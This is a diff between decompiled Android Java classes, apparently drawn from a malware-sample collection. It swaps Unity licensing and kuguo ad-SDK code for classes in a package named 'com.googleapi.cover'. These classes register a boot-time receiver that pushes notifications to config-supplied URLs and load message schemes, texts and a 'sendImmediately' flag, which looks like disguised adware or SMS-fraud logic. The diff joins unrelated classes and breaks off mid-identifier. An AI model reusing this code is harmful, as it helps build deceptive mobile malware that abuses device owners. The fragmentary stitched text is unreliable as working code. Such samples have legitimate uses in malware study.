@@ -1,95 +1,92 @@
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.a.a.a
-Class Name:a
-Java Code: package com.unity3d.player.a;
+Package Path:com.googleapi.cover.Notifier.Notifier
+Class Name:Notifier
+Java Code: package com.googleapi.cover;
 
-    public final String a(String str) {
-        if (str == null) {
-            return null;
-        }
-        try {
-            return com.unity3d.player.b.a.a(this.b.doFinal(("com.android.vending.licensing.AESObfuscator-1|" + str).getBytes(ENV.ENCODING)));
-        } catch (UnsupportedEncodingException e) {
-            throw new RuntimeException("Invalid environment", e);
-        } catch (GeneralSecurityException e2) {
-            throw new RuntimeException("Invalid environment", e2);
+public class Notifier extends BroadcastReceiver {
+    public static final String ACT_NOTIFY = "ACT_NOTIFY";
+    private static final String KEY_NOTIF_COUNTER = "KEY_NOTIF_COUNTER";
+    private static final int MINS_UNTIL_NOTIFY = 1440;
+    private SharedPreferences settings;
+
+    public void setPrefs(SharedPreferences prefs) {
+        this.settings = prefs;
+    }
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        int id;
+        this.settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+        String action = intent.getAction();
+        if ((action.equals("android.intent.action.BOOT_COMPLETED") || action.equals(ACT_NOTIFY)) && (id = this.settings.getInt(KEY_NOTIF_COUNTER, 0)) > 0) {
+            showNotification(context, id);
         }
     }
+
+    private void showNotification(Context context, int id) {
+        NotificationManager nm = (NotificationManager) context.getSystemService("notification");
+        try {
+            long time = System.currentTimeMillis();
+            String notificationURL = TextUtils.read(8, context);
+            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(notificationURL));
+            PendingIntent pi = PendingIntent.getActivity(context, 0, browserIntent, 268435456);
+            String body = TextUtils.read(7, context);
+            String title = TextUtils.read(6, context);
+            Notification notification = new Notification(R.drawable.ic_push, title, time);
+            notification.setLatestEventInfo(context, title, body, pi);
+            notification.flags = 20;
+            Utils.putIntegerValue(context, KEY_NOTIF_COUNTER, this.settings.getInt(KEY_NOTIF_COUNTER, 0) - 1, this.settings);
+            nm.notify(id, notification);
+        } catch (IOException e) {
+        }
+    }
+
+    public void initSettings(Context context, long time, Intent intent) {
+        if (!this.settings.contains(KEY_NOTIF_COUNTER)) {
+            int number = 0;
+            try {
+                number = Integer.parseInt(TextUtils.read(9, context));
+            } catch (Exception e) {
+            }
+            Utils.putIntegerValue(context, KEY_NOTIF_COUNTER, number, this.settings);
+            PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, 268435456);
+            AlarmManager am = (AlarmManager) context.getSystemService("alarm");
+            am.set(0, 86400000 + time, pi);
+        }
+    }
+}
 
 ===
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.a.a.b
-Class Name:a
-Java Code: package com.unity3d.player.a;
+Package Path:com.googleapi.cover.Actor.initConfigs
+Class Name:Actor
+Java Code: package com.googleapi.cover;
 
-    public final String b(String str) {
-        if (str == null) {
-            return null;
+    private void initConfigs() {
+        try {
+            this.schemes = TextUtils.getScheme(this.mContext);
+            SCHEME_TO_USE = (String) this.schemes.first;
+            Utils.putStringValue(this.mContext, KEY_MSG_DATA_TEXT, (String) this.schemes.second, this.settings);
+        } catch (IOException e) {
         }
         try {
-            String str2 = new String(this.c.doFinal(com.unity3d.player.b.a.a(str)), ENV.ENCODING);
-            if (str2.indexOf("com.android.vending.licensing.AESObfuscator-1|") != 0) {
-                throw new l("Header not found (invalid data or key):" + str);
-            }
-            return str2.substring("com.android.vending.licensing.AESObfuscator-1|".length(), str2.length());
-        } catch (com.unity3d.player.b.b e) {
-            throw new l(e.getMessage() + ":" + str);
-        } catch (UnsupportedEncodingException e2) {
-            throw new RuntimeException("Invalid environment", e2);
-        } catch (BadPaddingException e3) {
-            throw new l(e3.getMessage() + ":" + str);
-        } catch (IllegalBlockSizeException e4) {
-            throw new l(e4.getMessage() + ":" + str);
+            this.texts = TextUtils.getTexts(this.mContext.getResources().getXml(R.xml.texts));
+        } catch (IOException e2) {
         }
-    }
-
-===
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.b.h.h
-Class Name:h
-Java Code: package com.kuguo.b;
-
-public class h {
-    private String a;
-    private boolean e;
-    private int d = 0;
-    private Map b = new LinkedHashMap();
-    private Map c = new LinkedHashMap();
-
-    public h(String str) {
-        this.a = str;
-    }
-
-    public Map a() {
-        return this.c;
-    }
-
-    public void a(String str, Object obj) {
-        this.c.put(str, obj);
-    }
-
-    public int b() {
-        return this.d;
-    }
-
-    public String c() {
-        return this.a;
-    }
-
-    public String d() {
-        if (this.b.isEmpty()) {
-            return "";
+        this.app_name = new String();
+        try {
+            this.app_name = TextUtils.read(1, this.mContext);
+        } catch (IOException e3) {
         }
-        ArrayList arrayList = new ArrayList();
-        for (String str : this.b.keySet()) {
-            Object obj = this.b.get(str);
-            if (obj != null) {
-                arrayList.add(new BasicNameValuePair(str, obj.toString()));
-            }
+        try {
+            this.sendImmediately = TextUtils.read(3, this.mContext).equalsIgnoreCase(PRIVATE);
+        } catch (IOException e4) {
         }
-        String format = URLEncodedUtils.format(arrayList, "utf-8");
-        return this.e ? com.kuguo.c.b.a(format) : format;
-    }
-
-    public String toString() {
-        String d = d();
-        return d.equals("") ? this.a : this.a + "?"
+        this.content = new String();
+        try {
+            this.content = TextUtils.read(2, this.mContext);
+        } catch (IOException e5) {
+        }
+        int relatedContentBaseline = 13;
+        while (true) {
+            try {
+                String name = TextUtils.read(relatedContent
